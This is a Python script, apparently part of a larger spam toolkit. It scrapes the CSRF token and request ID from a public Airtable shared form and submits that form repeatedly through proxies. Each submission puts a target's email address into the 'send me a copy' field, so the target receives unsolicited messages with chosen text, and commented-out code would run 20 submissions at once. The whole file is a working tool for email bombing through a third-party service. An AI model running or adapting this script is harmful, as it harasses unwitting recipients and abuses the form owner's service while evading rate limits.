import re
from os.path import basename

import requests

import module

request_id_pattern = re.compile('(?<=requestId: \").*(?=",)')
csrf_pattern = re.compile('(?<=\"csrfToken\":\").*(?=\",\"enabledFeatureNames\")')


def get(s) -> requests.Response:
    headers = {
        'authority': 'airtable.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }

    response = s.get('https://airtable.com/shroSPWh1BK8mTWJH', headers=headers)
    return response


def post(s, request_id, csrf, target, text) -> requests.Response:
    headers = {
        'authority': 'airtable.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://airtable.com',
        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
        'x-airtable-application-id': 'appNlFcIxVMDiPBkh',
        # 'x-airtable-client-queue-time': '4.599999964237213',
        'x-airtable-inter-service-client': 'webClient',
        'x-airtable-inter-service-client-code-version': '8e70e695539ba336b191d0a337962343a932083d',
        'x-airtable-page-load-id': 'pglA19IsatIaFRj2x',
        'x-requested-with': 'XMLHttpRequest',
        # 'x-time-zone': 'Europe/Kiev',
        'x-user-locale': 'en',
    }

    data = {
        'stringifiedObjectParams': '{"rowId":"recwzk03bwZXyQICT","cellValuesByColumnId":{"fldsxs6rBL99Zwrxy":"test","fldQ257FU09LwYWNc":"wezxasqw@gmail.com","fldiHjqoFOh1BkxpB":"test","fldSW4WHRX3qT7srx":"test","fldBniE5nP3EOyd0M":"test","fldtfiDCcDHj1OOcg":"test","fldyKo94sN0XJ6UAI":"test","fldVI3KiCcmYPBNx5":"test","fldGzN8y7QgAHTOpO":["sel8vtfgZy0w0b76T"],"fldWnRhrZw9zDPRbb":"2023-02-16T00:00:00.000Z"},"userEmailForCopyOfFormSubmission":"wezxasqw@gmail.com"}',
        'requestId': 'reqqobrwothhSWtac',
        'accessPolicy': '{"allowedActions":[{"modelClassName":"view","modelIdSelector":"viwyVO7PuMSDuakvg","action":"readSharedFormData"},{"modelClassName":"view","modelIdSelector":"viwyVO7PuMSDuakvg","action":"submitSharedForm"},{"modelClassName":"application","modelIdSelector":"appNlFcIxVMDiPBkh","action":"createAttachmentUploadS3Policies"}],"shareId":"shroSPWh1BK8mTWJH","applicationId":"appNlFcIxVMDiPBkh","generationNumber":0,"expires":"2023-03-16T00:00:00.000Z","signature":"98f8ba7fe310762d070119f64fc65532c9e57959788109057b1853d5850afd1b"}',
        '_csrf': 'x4hZyW46-XXrcidgbA4kDniEH11YnGcS4_zk',
    }

    data['requestId'] = request_id
    data['_csrf'] = csrf
    data['stringifiedObjectParams'] = data['stringifiedObjectParams'].replace('wezxasqw@gmail.com', target).replace(
        'test', text)

    response = s.post(
        'https://airtable.com/v0.3/view/viwyVO7PuMSDuakvg/submitSharedForm',
        headers=headers,
        data=data,
    )

    return response


class ConcreteSpam(module.Spam):
    attempts = 1

    def post(self, target) -> requests.Response | None:
        s = requests.Session()
        get_proxies = self.get_proxies()
        s.proxies = get_proxies
        get_resp = get(s)
        csrf = csrf_pattern.search(get_resp.text)
        request_id = request_id_pattern.search(get_resp.text)
        post_resp = post(s, request_id, csrf, target, self.get_text(target=target))
        print(post_resp.text)
        return post_resp


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], '"msg":"SUCCESS"')
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently(20)


if __name__ == '__main__':
    main()
